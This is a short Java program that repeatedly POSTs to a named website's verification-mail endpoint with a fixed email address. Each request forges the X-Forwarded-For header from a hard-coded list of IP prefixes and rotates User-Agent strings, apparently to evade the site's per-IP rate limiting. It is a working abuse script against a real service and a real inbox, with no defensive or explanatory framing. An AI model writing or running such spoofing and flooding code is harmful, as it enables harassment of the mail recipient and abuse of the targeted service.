package com.click.clickall.limitip;

import java.io.OutputStream;
import java.net.URL;
import java.net.URLConnection;
import java.util.Random;

/**
 * @author LiaoYangJun
 * @createTime 2018/5/2.
 */
public class Post2 {

    public static final String[] ipArrays = {
            "66.102.251.", "112.211.0.", "141.8.225.","159.106.121.",
            "216.58.221.", "61.244.148.", "59.125.39.", "58.30.15.", "114.80.166.",
            "202.96.134.", "58.19.24.", "119.39.23.", "58.195.128.", "124.236.223.",
            "183.221.217.", "222.182.90.", "58.194.96.", "211.138.161.",
            "112.112.13.", "219.159.82.", "202.98.226.", " 61.128.101.",
            "130.039.000.", "130.039.255.", "131.230.000.","131.230.255.",
            "144.092.000.", "144.092.255.", "151.000.000.", "152.255.255.",
            "161.058.000.", "161.058.255.", "169.208.000.", "169.223.255.",
            "171.208.000.", "171.220.255.", "195.010.040.", "195.010.040.",
            "195.010.062.", "195.010.063.", "195.010.194.", "195.010.194.",
            "195.063.159.", "195.063.159.", "195.090.044.", "195.090.046.",
            "195.090.047.", "195.090.048.", "195.090.049.", "195.090.051.",
            "195.090.052.", "195.090.053.", "195.100.066.", "195.112.164.",
            "195.112.172.", "195.112.173."};

    public static void main(String[] args) throws Exception{

        for(int i=0; i<20; i++){
            Runnable runn = new Runnable() {
                public void run() {
                    try {
                        post();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            };
            new Thread(runn).run();
            Thread.sleep(2000);
        }
    }

    public static void post() throws Exception{
        URL url = new URL("http://pacx.51ideal.com/index.php/api/sendVerificationMail");
        URLConnection con = url.openConnection();

        con.setDoOutput(true);
        con.setDoInput(true);

        Random r = new Random();
        Integer counter = r.nextInt(255);

        int index = r.nextInt(34);
        String ip = ipArrays[index];

        con.setRequestProperty("X-Forwarded-For", ip + counter);
        System.out.println(ip+counter);
        con.setRequestProperty("cache-control","max-age=0");
        if(r.nextInt(10) % 2 == 0)
            con.setRequestProperty("User-Agent","Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.142 Safari/535.19");
        else
            con.setRequestProperty("User-Agent","Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0");

        con.setUseCaches(false);

        OutputStream out = con.getOutputStream();
        out.write(("email=dingqi19705@sina.com").getBytes());
        out.flush();
        out.close();
        con.getInputStream();
    }
}
